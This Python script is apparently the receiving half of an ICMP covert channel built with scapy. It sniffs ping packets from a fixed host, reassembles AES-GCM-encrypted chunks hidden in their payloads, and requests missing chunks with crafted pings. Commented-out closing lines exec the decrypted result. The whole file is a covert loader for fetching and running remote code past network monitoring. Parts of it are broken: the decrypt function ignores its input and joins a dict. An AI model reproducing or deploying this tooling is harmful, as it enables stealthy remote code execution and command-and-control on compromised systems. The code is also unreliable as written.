import os
import threading
from time import sleep

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from scapy.all import *

HOST_IP = "10.0.0.113"
FILLER_STRING = b"\00"
RESEND_MESSGE_ID = 9

fil = f"src host {HOST_IP} and icmp"
icmp_seq = 1
data_received = {}
complete_payload = ""
total_chunks = 3
chunks_recieved = set()
expected_chunks = set(range(0, total_chunks))
start_checking = False

with open("aes_key.bin", "rb") as key_file:
    symkey = key_file.read()


def handle_data_received(packet):
    if packet[ICMP].type == 0:
        print(packet)
        return
    global start_checking
    # data_received.append(packet[Raw].load.decode("unicode_escape"))
    if Raw not in packet:
        return
    packet_data = packet[Raw].load
    start_checking = True

    # first occurance of filler string
    headers, encrypted = packet_data.split(FILLER_STRING, 1)
    headers = headers.decode()
    message_type = int(headers[0])
    chunk_index = int(headers[1:])
    if message_type == 3:
        data_received[chunk_index] = encrypted
        chunks_recieved.add(chunk_index)

    print(message_type, chunk_index)
    print(headers, encrypted)
    # decrypted_data = decrypt_chunk(packet_data)

    # data_received.append(packet[Raw].load)


def send_recover(missing: set[int]):
    global icmp_seq

    # the id comes from the current process id and doing a Internet checksum (used to identify the "session" or "process" sending the ping)
    icmp_id = os.getpid() & 0xFFFF
    # seq increments per sent packet, helps detect packet loss, track individual requests

    for chunk_index in missing:
        payload = f"{RESEND_MESSGE_ID}{chunk_index}"

        icmp_packet = (IP(dst=HOST_IP) / ICMP(id=icmp_id, seq=icmp_seq) /
                       Raw(load=payload.encode()))

        resp = sr1(icmp_packet, verbose=0, timeout=3)

        icmp_seq += 1
        if resp:
            # got "ack" (icmp response back)
            pass
        else:
            return None


def decrypt_chunk(chunk: bytes) -> bytes:
    aesgcm = AESGCM(symkey)
    # extract nonce and ciphertext
    cipehertext = b"".join(data_received)
    nonce = cipehertext[:12]
    enc_text = cipehertext[12:]

    print(cipehertext)
    # decrypt
    decrypted = aesgcm.decrypt(nonce, enc_text, associated_data=None)
    return decrypted


stop_sniffing = False


def sniffer():
    sniff(filter=fil,
          prn=handle_data_received,
          stop_filter=lambda p: stop_sniffing)


sniffer_thread = threading.Thread(target=sniffer, daemon=True)
sniffer_thread.start()

while True:
    sleep(1)

    if start_checking:
        missing = expected_chunks - chunks_recieved
        if missing:
            print("Missing chunks:", missing)
            send_recover(missing)
        else:
            print("All chunks received.")
            stop_sniffing = True
            break

# decrypted = decrypt_chunk(data_received[0])
# exec(decrypted.decode())

# exec("".join(data_received))
